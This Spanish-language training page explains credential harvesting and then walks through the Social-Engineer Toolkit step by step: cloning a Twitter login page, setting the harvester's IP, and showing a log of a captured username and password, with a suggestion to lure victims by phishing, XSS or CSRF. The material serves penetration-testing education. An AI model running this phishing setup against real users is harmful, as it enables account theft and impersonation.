---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Credential Harvesting

La recolección de credenciales es una técnica de recopilan credenciales de usuario (como ID de usuario, direcciones de correo electrónico, contraseñas y otra información de inicio de sesión).

### ¿Cómo funciona la recolección de credenciales?

Lo más habitual es que se instale un recolector de credenciales  como una extensión maliciosa de un sitio web o una aplicación. Una vez instalado, el recolector registra cualquier información que los usuarios ingresen durante el proceso de inicio de sesión.

Debido a que los recolectores de credenciales registran todos los inicios de sesión de manera indiscriminada, los ciberdelincuentes pueden crear una reserva de nombres de usuario y contraseñas.

Si un ciberdelincuente tiene acceso a una o más contraseñas comprometidas que un individuo usó en el pasado, esa credencial le proporciona un excelente punto de partida para adivinar su información de inicio de sesión para otros sitios o sistemas.

### Técnicas comunes utilizadas en ataques de recolección de credenciales <a href="#techniques" id="techniques"></a>

La recolección de credenciales normalmente se lleva a cabo junto con otra técnica de ciberataque. Métodos de ataque más frecuentes incluyen los siguientes:

* **Malware**
* **Phishing**
* **Suplantación de dominio**
* **Ataques Man-in-the-Middle (MitM)**

Una de las formas más comunes en que los atacantes realizan la recolección de credenciales es mediante el uso de correos electrónicos de phishing y de phishing con enlaces que podrían redirigir a un usuario a un sitio falso. Este "sitio falso" podría simular un servicio en la nube legítimo, como Gmail, Office 365 o incluso un sitio de redes sociales como Twitter, LinkedIn, Instagram o Facebook. Por eso es tan importante utilizar la autenticación multifactor. Sin embargo, en algunos casos, los atacantes podrían eludir la autenticación multifactor redirigiendo al usuario a un sitio malicioso y robando una cookie de sesión del navegador del usuario.

Muchos servicios y aplicaciones alojadas en la nube utilizan el inicio de sesión único (SSO) y otros utilizan autenticación federada. A veces, las aplicaciones basadas en la nube le permiten iniciar sesión con sus credenciales de Google, Apple o Facebook. Los atacantes podrían redirigir a los usuarios a sitios web suplantados que pueden parecer páginas de inicio de sesión legítimas de Google, Apple, Facebook o Twitter. Desde allí, el atacante podría robar el nombre de usuario y la contraseña de la víctima.&#x20;

#### Ataque de recolección de credenciales mediante correos electrónicos de ingeniería social y phishing

Realizar un ataque de ingeniería social y crear una instancia de un sitio web falso para realizar un ataque de recolección de credenciales.

**Paso 1** . Inicie SET ingresando el comando **setoolkit**.

**Paso 2** . Seleccioneen el menú principal, como se muestra en el Ejemplo 7-1.

Inicio del ataque de ingeniería social

```
Select from the menu:
   1) Social-Engineering Attacks
   2) Penetration Testing (Fast-Track)
   3) Third Party Modules
   4) Update the Social-Engineer Toolkit
   5) Update SET configuration
   6) Help, Credits, and About
  99) Exit the Social-Engineer Toolkit
set> 1
```

**Paso 3** . Selección de vectores de ataque a sitios web

```
Select from the menu:
    1) Spear-Phishing Attack Vectors
    2) Website Attack Vectors
    3) Infectious Media Generator
    4) Create a Payload and Listener
    5) Mass Mailer Attack
    6) Arduino-Based Attack Vector
    7) Wireless Access Point Attack Vector
    8) QRCode Generator Attack Vector
    9) Powershell Attack Vectors
   10) Third Party Modules
   99) Return back to the main menu.
set>2 
```

**Etapa 4** . En el menú y la explicación que aparecen a continuación (consulte el Ejemplo 7-3), seleccione **Método de ataque de recolección de credenciales** .

```
The Web Attack module is a unique way of utilizing multiple web-based
attacks in order to compromise the intended victim.
The Java Applet Attack method will spoof a Java Certificate and
deliver a metasploit based payload. Uses a customized java applet
created by Thomas Werth to deliver the payload.
The Metasploit Browser Exploit method will utilize select Metasploit
browser exploits through an iframe and deliver a Metasploit payload.
The Credential Harvester method will utilize web cloning of a
website that has a username and password field and harvest all
the information posted to the website.
The TabNabbing method will wait for a user to move to a different
tab, then refresh the page to something different.
The Web-Jacking Attack method was introduced by white_sheep, emgent.
This method utilizes iframe replacements to make the highlighted URL
link to appear legitimate however when clicked a window pops up then
is replaced with the malicious link. You can edit the link replacement
settings in the set_config if it's too slow/fast.
The Multi-Attack method will add a combination of attacks through
the web attack menu. For example, you can utilize the Java Applet,
Metasploit Browser, Credential Harvester/Tabnabbing all at once to see
which is successful.
The HTA Attack method will allow you to clone a site and perform
powershell injection through HTA files which can be used for
Windows-based powershell exploitation through the browser.
   1) Java Applet Attack Method
   2) Metasploit Browser Exploit Method
   3) Credential Harvester Attack Method
   4) Tabnabbing Attack Method
   5) Web Jacking Attack Method
   6) Multi-Attack Web Method
   7) HTA Attack Method
  99) Return to Main Menu
set:webattack>3
```

**Paso 5** . Seleccione  Plantillas web para utilizar una plantilla web predefinida (Twitter).&#x20;

```
The first method will allow SET to import a list of pre-defined web
applications that it can utilize within the attack.
The second method will completely clone a website of your choosing
and allow you to utilize the attack vectors within the completely
same web application you were attempting to clone.
The third method allows you to import your own website, note that you
should only have an index.html when using the import website
functionality.
   1) Web Templates
   2) Site Cloner
   3) Custom Import
  99) Return to Webattack Menu
set:webattack>1
```

**Paso 6** . Ingrese la dirección IP del host que le gustaría usar para recopilar las credenciales del usuario.

```
[-] Credential harvester will allow you to utilize the clone
capabilities within SET
[-] to harvest credentials or parameters from a website as well as
place them into a report
-----------------------------------------------------------------------
-- * IMPORTANT * READ THIS BEFORE ENTERING IN THE IP ADDRESS *
IMPORTANT * --
The way that this works is by cloning a site and looking for form
fields to rewrite. If the POST fields are not usual methods for
posting forms this could fail. If it does, you can always save the
HTML, rewrite the forms to be standard forms and use the "IMPORT"
feature. Additionally, really important:
If you are using an EXTERNAL IP ADDRESS, you need to place the
EXTERNAL IP address below, not your NAT address. Additionally, if
you don't know basic networking concepts, and you have a private
IP address, you will need to do port forwarding to your NAT IP
address from your external IP address. A browser doesn't know how
to communicate with a private IP address, so if you don't specify
an external IP address if you are using this from an external
perspective, it will not work. This isn't a SET issue this is how
networking works.
set:webattack> IP address for the POST back in Harvester/Tabnabbing
[192.168.88.225]:

```

**Paso 7** . Seleccione **Twitter** o cualquier plantilla objetivo.

```
--------------------------------------------------------
                 **** Important Information ****
For templates, when a POST is initiated to harvest
credentials, you will need a site for it to redirect.
You can configure this option under:
      /etc/setoolkit/set.config
Edit this file, and change HARVESTER_REDIRECT and
HARVESTER_URL to the sites you want to redirect to
after it is posted. If you do not set these, then
it will not redirect properly. This only goes for
templates.
--------------------------------------------------------
  1. Java Required
  2. Google
  3. Twitter
set:webattack> Select a template:3
[*] Cloning the website: http://www.twitter.com
[*] This could take a little bit...
The best way to use this attack is if username and password form
fields are available. Regardless, this captures all POSTs on a
website.
[*] The Social-Engineer Toolkit Credential Harvester Attack
[*] Credential Harvester is running on port 80
[*] Information will be displayed to you as it arrives below:
```

Luego, puede redirigir a los usuarios a este sitio falso de Twitter enviando un correo electrónico de phishing o aprovechando vulnerabilidades web como secuencias de comandos entre sitios (XSS) y falsificación de solicitudes entre sitios (CSRF).

_Recopilación de credenciales de usuario._

```
192.168.78.238 - - [28/Jun/2021 23:07:41] "GET / HTTP/1.1" 200 -
[*] WE GOT A HIT! Printing the output:
POSSIBLE USERNAME FIELD FOUND: session[username_or_email]=santosomar
POSSIBLE PASSWORD FIELD FOUND: session[password]=superbadpassword
PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
PARAM: scribe_log=
POSSIBLE USERNAME FIELD FOUND: redirect_after_login=
PARAM: authenticity_token=dba33c0b2bfdd8e6dcb14a7ab4bd121f38177d52
[*] WHEN YOU'RE FINISHED, HIT CONTROL-C TO GENERATE A REPORT.
192.168.78.238 - - [28/Jun/2021 23:08:27] "POST /sessions HTTP/1.1"
302 - 

```

<mark style="color:red;">**Recursos**</mark>&#x20;

{% embed url="https://www.crowdstrike.com/cybersecurity-101/cyberattacks/credential-harvesting/" %}
